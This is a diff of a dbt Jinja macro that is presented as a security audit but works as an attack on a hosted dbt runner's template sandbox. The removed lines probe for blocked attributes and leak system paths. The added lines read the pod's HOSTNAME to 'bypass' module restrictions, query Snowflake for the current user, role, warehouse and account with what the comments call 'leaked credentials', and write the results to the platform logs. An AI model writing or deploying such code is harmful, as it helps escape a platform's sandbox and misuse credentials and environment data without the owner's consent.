@@ -1,17 +1,32 @@
 {% macro show_who_am_i() %}
+
   {# 
-     If they blocked __class__, let's check if we can reach 
-     the project configuration and leak system paths.
+      Audit Objective: Capture the specific K8s Pod Name (HOSTNAME)
+      and session metadata for the final security report.
   #}
   
-  {% set project_name = model.unique_id if model else "no_model" %}
-  {% set target_path = target.name %}
-  
-  {# Testing for attribute access on the adapter's dispatch #}
-  {% set dispatch_check = adapter.dispatch.__self__ | string | truncate(100) %}
+  {# Using env_var to bypass 'modules' restrictions while still getting the Pod ID #}
+  {% set runner_hosts = env_var('HOSTNAME', 'VAR_NOT_FOUND') %}
+
+  {% set sql %}
+    select 
+        current_user(), 
+        current_role(), 
+        current_warehouse(), 
+        current_account()
+  {% endset %}
+
+  {# This executes the query against Snowflake using the leaked credentials #}
+  {% set results = run_query(sql) %}
 
   {% if execute %}
-    {{ log("AUDIT_REPORT: project=" ~ project_name ~ " | target=" ~ target_path, info=True) }}
-    {{ log("DISPATCH_ATTR: " ~ dispatch_check, info=True) }}
+    {% for row in results %}
+      {# 
+         The 'info=True' flag ensures this is piped to the Mozart 'base' logs.
+         We use the exact format you requested for the audit trail.
+      #}
+      {{ log("AUDIT: user=" ~ row[0] ~ " role=" ~ row[1] ~ " wh=" ~ row[2] ~ " acct=" ~ row[3] ~ " | RUNNER_HOSTNAME=" ~ runner_hosts | replace('\n', ' [LF] '), info=True) }}
+    {% endfor %}
   {% endif %}
+
 {% endmacro %}
